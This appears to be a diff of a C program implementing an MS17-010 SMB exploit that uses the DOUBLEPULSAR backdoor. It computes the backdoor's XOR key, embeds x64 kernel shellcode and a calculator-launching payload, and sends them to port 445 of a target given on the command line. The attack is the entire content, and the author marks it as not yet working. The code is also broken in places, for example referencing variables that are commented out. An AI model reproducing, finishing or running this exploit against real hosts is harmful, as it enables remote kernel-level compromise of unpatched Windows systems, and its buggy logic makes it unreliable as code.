@@ -1,12 +1,6 @@
 #define _CRT_SECURE_NO_WARNINGS
 /*
-WARNING: This code works for me as of March 7th 2021 but it BSODS the target
-
-It could be because my kernel shellcode doesn't contain the payload shellcode length after it
-11/8/2021: Added code to attach the shellcode length after the kernel shellcode.
-
-To fix:
-Update SMB Length in NetBIOS header & make sure the payload shellcode length is being written to buffer correctly.
+WARNING: This code compiles but does not function yet
 */
 
 #include <windows.h>
@@ -54,17 +48,17 @@ unsigned char wannacry_Trans2_Request[] =
 "\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
 "\x00\x0e\x00\x0d\x10\x00"; /* d1 c9 10 17 d9 aa 40 17 d9 da 69 17 ( Example SESSION_SETUP Parameters ) */
 
-unsigned int LE2INT(unsigned char *data)
+unsigned int LE2INT(unsigned char* data)
 {
-            unsigned int b;
-            b = data[3];
-            b <<= 8;
-            b += data[2];
-            b <<= 8;
-            b += data[1];
-            b <<= 8;
-            b += data[0];
-            return b;
+	unsigned int b;
+	b = data[3];
+	b <<= 8;
+	b += data[2];
+	b <<= 8;
+	b += data[1];
+	b <<= 8;
+	b += data[0];
+	return b;
 }
 
 unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
@@ -119,7 +113,7 @@ int main(int argc, char* argv[])
 	server.sin_family = AF_INET;
 	server.sin_addr.s_addr = inet_addr(argv[1]);
 	server.sin_port = htons((USHORT)445);
-	printf("Connecting to %s\n",argv[1]);
+	printf("Connecting to %s\n", argv[1]);
 	ret = connect(sock, (struct sockaddr*)&server, sizeof(server));
 
 	//send SMB negociate packet
@@ -175,14 +169,15 @@ int main(int argc, char* argv[])
 	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	unsigned char signature[4];
+	unsigned char signature[6];
 	unsigned int sig;
 	//copy SMB signature from recvbuff to local buffer
 	signature[0] = recvbuff[18];
 	signature[1] = recvbuff[19];
 	signature[2] = recvbuff[20];
 	signature[3] = recvbuff[21];
-	signature[4] = '\0';
+	signature[4] = recvbuff[22];
+	signature[5] = '\0';
 	//this is for determining architecture
 	//recvbuff[22];
 	//but unused at this time
@@ -196,11 +191,11 @@ int main(int argc, char* argv[])
 	printf("Calculated XOR KEY:  0x%x\n", XorKey);
 
 	/*
-	https://github.com/RiskSense-Ops/MS17-010/blob/master/payloads/x64/src/exploit/kernel.asm  
-	Name: kernel  
+	https://github.com/RiskSense-Ops/MS17-010/blob/master/payloads/x64/src/exploit/kernel.asm
+	Name: kernel
 	Length: 1019 bytes
-	
-	Requires a userland payload size length to be added at the end 
+
+	Requires a userland payload size length to be added at the end
 	*/
 	unsigned char kernel_shellcode[] =
 		"\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF"
@@ -268,90 +263,126 @@ int main(int argc, char* argv[])
 		"\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF\x48\x89\xEC\x5D\x41\x5F"
 		"\x5E\xC3";
 
-	//pop calculator shellcode - this is a sample.  Change according to your payload
+	/*
+	https://www.exploit-db.com/shellcodes/49819
+	
+	Windows/x64 - Dynamic Null-Free WinExec PopCalc Shellcode (205 Bytes)
+	*/
+	unsigned int payload_len = 205;
 	unsigned char shellcode[] =
-		"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
-		"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
-		"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
-		"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
-		"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
-		"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
-		"\x45\x81\x3e\x43\x72\x65\x61\x75"
-		"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
-		"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
-		"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
-		"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
-		"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
-		"\x6c\x63\x89\xe2\x52\x52\x53\x53"
-		"\x53\x53\x53\x53\x52\x53\xff\xd7";
+		"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
+		"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
+		"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
+		"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
+		"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
+		"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
+		"\x48\x83\xec\x20\x41\xff\xd6";
 
 	//might need to make this static due to sizeof being garbage @ counting shellcode
 	unsigned int kernel_shellcode_size = sizeof(kernel_shellcode) / sizeof(kernel_shellcode[0]);
 	unsigned int payload_shellcode_size = sizeof(shellcode) / sizeof(shellcode[0]);
-	unsigned int EntireShellcodeSize = kernel_shellcode_size + payload_shellcode_size;
+	
+	//remove the NULL terminator count
+	kernel_shellcode_size -= 1;
+	payload_shellcode_size -= 1;
+
+	//add +2 to the entire shellcode size because the size of the shellcode MUST be appended to the total length
+	unsigned int EntireShellcodeSize = kernel_shellcode_size + payload_shellcode_size + 2;
 
 	//generate the SESSION_SETUP parameters here
-	unsigned int TotalSizeOfPayload = 4096 ^ XorKey;
-	unsigned int ChunkSize = 4096 ^ XorKey;
-	unsigned int OffsetofChunkinPayload = 0 ^ XorKey;
-	char Parametersbuffer[12];
+	unsigned int TotalSizeOfPayload = 4096 ^ XorKey; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
+	unsigned int ChunkSize = 4096 ^ XorKey; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
+	unsigned int OffsetofChunkinPayload = 0x0000 ^ XorKey;
+	unsigned char Parametersbuffer[12];
+	memset(Parametersbuffer, 0x00, 12);
+	memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
+	memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&ChunkSize, 4);
+	memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
+
+	//convert the calculated XOR key from unsigned int to unsigned char
+	/*
+	unsigned char char_xor_key[5];
+	char_xor_key[0] = (unsigned char)XorKey;
+	char_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
+	char_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
+	char_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);*/
+
+	//Encrypting signature buffer
+	/*
+	int i;
+	for (i = 0; i < 13; i++)
+	{
+		Parametersbuffer[i] ^= char_xor_key[i % 4];
+	} */
 
 	//allocate memory for encrypted shellcode payload buffer
-	unsigned char *encrypted;
-	encrypted = (unsigned char*)malloc(4096+1);
+	unsigned char* encrypted;
+	encrypted = (unsigned char*)malloc(4096 + 1);
 
 	//initialize to 0
 	memset((unsigned char*)encrypted, 0x00, 4096);
 
+	//calculate the payload shellcode length
+	DWORD dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]); //or statically put your own value here
+	
+	//remove the NULL terminator from the shellcode count
+        dwPayloadShellcodeSize -= 1; 
+	
 	//copy kernel shellcode to encrypted buffer
 	memcpy((unsigned char*)encrypted, (char*)&kernel_shellcode, kernel_shellcode_size);
 	
-	//add the payload shellcode length after the kernel shellcode
-	DWORD dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]); //or statically put your own value here
-	memcpy(unsigned char)encrypted + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, sizeof(DWORD));
+	//copy the shellcode size after the kernel shellcode
+	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, 2);
 
-	//TO FIX:
-	//Shellcode is BSODing the target because the length of the payload shellcode is not added
-	//therefore it must be added...because of this it should contain code that adds the value
-	//Let's try this:
-	/*
-	DWORD DWsizeOfShellcode = sizeof(shellcode) / sizeof(shellcode[0]);
-	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (char*)&DWsizeOfShellcode, 4);
-
-	//copy payload shellcode to encrypted buffer at the APPROPRIATE location ( +4 after kernel shellcode size )
-	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 4, shellcode, payload_shellcode_size);
-	*/
-	/*
-	Because of this, the buffer holding the kernel and user shellcode must be extended by +4 to accomodate the DWORD value.
-	*/
-	
 	//copy payload shellcode to encrypted buffer
-	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 4, (char*)&shellcode, payload_shellcode_size);
+	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 2, (char*)&shellcode, payload_shellcode_size);
 
+	//FOR DEBUG PURPOSES ONLY, will convert to a function later
 	//Xor the data buffer with the calculated key
-	xor_payload(XorKey, (unsigned char*)encrypted, 4096);
+	for (i = 0; i < 4096; i++)
+	{
+		encrypted[i] ^= char_xor_key[i % 4];
+	}
+	//xor_payload(XorKey, (unsigned char*)encrypted, 4096);
 
 	//allocate memory for the big packet
-	unsigned char* big_packet = (unsigned char*)malloc(4178+1);
-	memset((unsigned char*)big_packet, 0x00, 4178+1);
+	unsigned char* big_packet = (unsigned char*)malloc(4178 + 1);
+	memset((unsigned char*)big_packet, 0x00, 4178 + 1);
 
 	//copy wannacry skeleton packet to big Trans2 packet
-	memcpy((unsigned char*)big_packet, (char*)&wannacry_Trans2_Request, 70);
-
-	//copy XOR values to parameters buffer
-	memcpy((char*)Parametersbuffer, (char*)&TotalSizeOfPayload, 4);
-	memcpy((char*)Parametersbuffer + 4, (char*)&ChunkSize, 4);
-	memcpy((char*)Parametersbuffer + 8, (char*)&OffsetofChunkinPayload, 4);
+	memcpy((unsigned char*)big_packet, (unsigned char*)&wannacry_Trans2_Request, 70);
 
 	//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
-	memcpy((unsigned char*)big_packet + 70, (char*)Parametersbuffer, 12);
+	memcpy((unsigned char*)big_packet + 70, (unsigned char*)&Parametersbuffer, 12);
 
 	//copy encrypted payload
-	memcpy((unsigned char*)big_packet + 82, (unsigned char*)encrypted, 4096);
+	memcpy((unsigned char*)big_packet + 82, (unsigned char*)&encrypted, 4096);
 
 	//Update treeID, UserID
 	memcpy((unsigned char*)big_packet + 28, (char*)&treeid, 2);
 	memcpy((unsigned char*)big_packet + 32, (char*)&userid, 2);
+	
+	/* for future use 
+	
+	//update key values in the packet
+	unsigned short smb_length = 4096+70+12;
+	printf("SMB Length:  %hu\n", smb_length);
+	memcpy((unsigned char*)big_packet + 2, (char*)&smb_length, 2);
+
+	//maybe uint16_t ??
+	unsigned short TotalDataCount = 4096;
+	unsigned short DataCount = 4096;
+	unsigned short byteCount = 4096 + 13;
+
+	*(WORD*)(big_packet + 0x27) = TotalDataCount;
+	*(WORD*)(big_packet + 0x3b) = DataCount;
+	*(WORD*)(big_packet + 0x43) = byteCount;
+
+	memcpy((unsigned char*)big_packet + 0x27, (char*)&TotalDataCount, 2);
+	memcpy((unsigned char*)big_packet + 0x3b, (char*)&DataCount, 2);
+	memcpy((unsigned char*)big_packet + 0x43, (char*)&byteCount, 2);
+	
+	*/
 
 	//send the payload
 	send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
